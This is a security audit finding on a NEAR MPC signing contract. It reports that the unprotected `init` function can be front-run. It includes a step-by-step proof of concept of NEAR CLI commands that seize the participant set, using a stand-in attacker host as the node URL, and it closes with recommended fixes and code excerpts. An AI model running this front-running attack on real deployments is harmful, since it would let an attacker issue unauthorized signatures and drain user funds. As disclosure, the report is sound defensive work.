### Title
Unprotected `init` Function Allows Any Caller to Seize MPC Participant Control - (File: crates/contract/src/lib.rs)

### Summary
The `MpcContract::init` function is publicly callable by any NEAR account. Because the standard deployment workflow deploys the contract binary without an atomic initialization call, a race window exists in which an attacker can call `init` before the legitimate operator, injecting attacker-controlled accounts as the initial participant set and receiving mocked TEE attestations that satisfy every subsequent privileged-caller check.

### Finding Description
`init` carries the `#[init]` attribute, which only prevents a second initialization once state exists. It carries **no** `#[private]` attribute and performs no caller check. Compare it with the two other initialization helpers in the same `impl` block:

- `init_running` — `#[private]` + `#[init]` → only the contract account can call it.
- `migrate` — `#[private]` + `#[init(ignore_state)]` → only the contract account can call it.
- `init` — `#[init]` only → **any** NEAR account can call it. [1](#0-0) 

Every documented deployment procedure deploys the WASM binary with `without-init-call` and then calls `init` in a separate transaction:

```
near contract deploy $MPC_CONTRACT_ACCOUNT use-file "$MPC_CONTRACT_PATH" without-init-call ...
near contract call-function as-transaction mpc-contract.test.near init file-args ...
``` [2](#0-1) 

This creates a race window of at least one block between deployment and initialization. An attacker who monitors the chain for a new contract deployment can submit a `init` call in the very next block, supplying their own `ThresholdParameters` with attacker-controlled `account_id` and `tls_public_key` values.

Inside `init`, the contract calls `TeeState::with_mocked_participant_attestations` for every supplied participant: [3](#0-2) 

This stores a `VerifiedAttestation::Mock(Valid)` entry keyed by the participant's TLS key, and critically sets `account_public_key = tls_public_key` as a placeholder. Because the attacker chose the TLS key, they can add it as a function-call access key on their NEAR account. Every subsequent privileged check (`assert_caller_is_attested_participant_and_protocol_active`) compares `env::signer_account_pk()` against the stored `account_public_key`: [4](#0-3) 

Since `account_public_key == tls_public_key` and the attacker controls that key, the check passes. The attacker is now a fully authenticated participant able to call `vote_add_domains`, `start_keygen_instance`, `vote_pk`, and `respond`.

### Impact Explanation
**Critical — Unauthorized threshold signature issuance.**

Once the attacker controls the initial participant set they can:
1. Add signing domains via `vote_add_domains`.
2. Drive DKG to completion via `start_keygen_instance` / `vote_pk`, generating keys under their control.
3. Respond to any user `sign` request via `respond`, issuing threshold signatures for arbitrary foreign-chain transactions without legitimate MPC authorization.

Any user who deposits funds and calls `sign` on the hijacked contract receives a signature produced entirely by the attacker's nodes. The attacker can sign any payload — including transactions that drain user-controlled foreign-chain wallets — and the on-chain contract state will record the response as legitimate.

### Likelihood Explanation
**High.** The deployment procedure is documented to always use `without-init-call`. The race window is a single block (~1 second on NEAR). An attacker running a standard NEAR indexer can detect the deployment event and submit the malicious `init` call in the immediately following block. No special privilege, leaked key, or threshold collusion is required — only a funded NEAR account and knowledge of the contract's ABI.

### Recommendation
1. **Add `#[private]` to `init`**, matching the pattern already used by `init_running` and `migrate`. This restricts callers to the contract account itself (`predecessor_account_id == current_account_id`).
2. **Use an atomic deploy-and-init** transaction (NEAR supports deploying and calling an init method in a single transaction) to eliminate the race window entirely.
3. **Audit `with_mocked_participant_attestations`**: the TODO comment at line 1942–1943 acknowledges that initial participants bypass real TEE attestation. Requiring real attestations at init time would further reduce the blast radius of any future access-control gap. [5](#0-4) 

### Proof of Concept

```
# Step 1 – Legitimate operator deploys the contract binary (no init call).
near contract deploy v1.signer use-file mpc_contract.wasm without-init-call \
  network-config mainnet sign-with-keychain send

# Step 2 – Attacker (watching the chain) calls init in the next block,
#           injecting their own account as the sole participant with threshold=1.
near contract call-function as-transaction v1.signer init json-args '{
  "parameters": {
    "participants": {
      "next_id": 1,
      "participants": [[
        "attacker.near",
        0,
        { "tls_public_key": "<ATTACKER_ED25519_TLS_KEY>",
          "url": "http://attacker.example.com:3000" }
      ]]
    },
    "threshold": 1
  }
}' prepaid-gas '300 Tgas' attached-deposit '0 NEAR' \
  sign-as attacker.near network-config mainnet sign-with-keychain send

# Step 3 – Attacker adds their TLS key as a function-call access key so that
#           signer_account_pk == stored account_public_key (== tls_public_key).
near account add-key attacker.near grant-function-call-access \
  --allowance unlimited --contract-account-id v1.signer --function-names '' \
  use-manually-provided-public-key <ATTACKER_ED25519_TLS_KEY> \
  network-config mainnet sign-with-keychain send

# Step 4 – Attacker drives DKG and responds to any user sign() request,
#           issuing unauthorized threshold signatures for arbitrary payloads.
```

The legitimate operator's subsequent `init` call fails with "contract already initialized", and the contract is permanently under attacker control.

        parameters: dtos::ThresholdParameters,

        let parameters: ThresholdParameters = parameters.try_into_contract_type()?;
        // Log participant count and hash - full parameters exceed NEAR's 16KB log limit at ~100 participants
        let params_hash = env::sha256_array(borsh::to_vec(&parameters).unwrap());

            parameters.participants().len(),
            params_hash,
            init_config,
        );

        // participants being immediately kicked out once contract transitions into running.

    pub(crate) fn with_mocked_participant_attestations(participants: &Participants) -> Self {
        let mut tee_state = Self::default();

        for (account_id, _, participant_info) in participants.participants() {
            let tls_public_key = participant_info.tls_public_key.clone();
            // TODO(#1087): replace account_public_key with a real account public
            // key passed in by the caller. `Participants` does not currently
            // carry the operator's account public key, so a mocked entry
            // cannot record the real one and we use the TLS key as a unique
            // per-participant placeholder. The mock keeps the
            // participant from being kicked out of an empty `TeeState` until
            // a real `submit_participant_info` call replaces it (keyed by
            // TLS), but any caller-facing check that compares
            // `signer_account_pk` against the stored key will fail until
            // then. #1087 tracks threading real attestations through
            // initialization so this sentinel can go away.
            let node_id = NodeId {
                account_id: account_id.clone(),
                tls_public_key: tls_public_key.clone(),
                // Use tls_public_key as account_public_key instead of hardcoded
                // Ed25519PublicKey::from([0u8; 32]) so that same account public
                // key isn't associated with different tls keys.
                // This is not a fix for above issue: #1087, which should be
                // addressed outside this PR.
                account_public_key: tls_public_key.clone(),
            };

            tee_state.stored_attestations.insert(
                tls_public_key,
                NodeAttestation {
                    node_id,
                    verified_attestation: VerifiedAttestation::Mock(
                        attestation::MockAttestation::Valid,
                    ),
                },
            );
        }

        tee_state
    }

    pub(crate) fn is_caller_an_attested_participant(
        &self,
        participants: &Participants,
    ) -> Result<(), AttestationCheckError> {
        let signer_account_pk = env::signer_account_pk();
        let signer_id = env::signer_account_id();

        let info = participants
            .info(&signer_id)
            .ok_or(AttestationCheckError::CallerNotParticipant)?;

        let attestation = self
            .stored_attestations
            .get(&info.tls_public_key)
            .ok_or(AttestationCheckError::AttestationNotFound)?;

        if attestation.node_id.account_id != signer_id {
            return Err(AttestationCheckError::AttestationOwnerMismatch);
        }

        // Stored account keys are Ed25519 by construction; a non-Ed25519
        // signer necessarily mismatches.
        let signer_ed25519 = Ed25519PublicKey::try_from(&signer_account_pk)
            .map_err(|_| AttestationCheckError::AttestationKeyMismatch)?;
        if attestation.node_id.account_public_key != signer_ed25519 {
            return Err(AttestationCheckError::AttestationKeyMismatch);
        }

        Ok(())
    }
